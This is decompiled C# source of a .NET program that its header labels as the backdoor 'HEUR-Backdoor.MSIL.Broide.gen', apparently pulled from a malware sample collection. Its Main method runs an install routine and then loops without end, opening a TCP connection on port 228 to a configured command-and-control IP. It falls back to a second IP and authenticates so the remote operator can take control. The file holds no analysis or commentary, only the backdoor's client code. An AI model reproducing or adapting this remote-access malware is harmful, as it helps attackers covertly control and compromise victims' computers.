// Decompiled with JetBrains decompiler
// Type: RemoteClient.Program
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using RemoteClient.nagruz;
using rtewsd.Startsd;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RemoteClient
{
  public static class Program
  {
    public static bool needReconnect = true;
    public static string[] _Args;
    public static byte[] id = Encoding.ASCII.GetBytes(Path.GetRandomFileName() + Path.GetRandomFileName());
    public static int rtt = 0;

    [STAThread]
    public static void Main(string[] Args)
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new sdfsdfsg());
      testfunc.Install();
      while (Program.needReconnect)
      {
        if (!(Config.retip == ""))
        {
          try
          {
            Program._Args = Args;
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect((EndPoint) new IPEndPoint(IPAddress.Parse(Config.retip), 228));
            Connection.RemoteClient_2 = new RemoteClient.RemoteClient(socket);
            Connection.RemoteClient_2.Auth();
            while (Connection.RemoteClient_2.clientState)
              Thread.Sleep(1000);
            Thread.Sleep(5000);
            Connection.RemoteClient_2 = (RemoteClient.RemoteClient) null;
          }
          catch
          {
            Thread.Sleep(new Random().Next(1000, 3000));
            Config.retip = "";
          }
        }
        else
        {
          try
          {
            Program._Args = Args;
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect((EndPoint) new IPEndPoint(IPAddress.Parse(Config.ip), 228));
            Connection.RemoteClient_2 = new RemoteClient.RemoteClient(socket);
            Connection.RemoteClient_2.Auth();
            while (Connection.RemoteClient_2.clientState)
              Thread.Sleep(1000);
            Thread.Sleep(5000);
            Connection.RemoteClient_2 = (RemoteClient.RemoteClient) null;
          }
          catch
          {
            Thread.Sleep(new Random().Next(1000, 3000));
          }
        }
      }
    }
  }
}
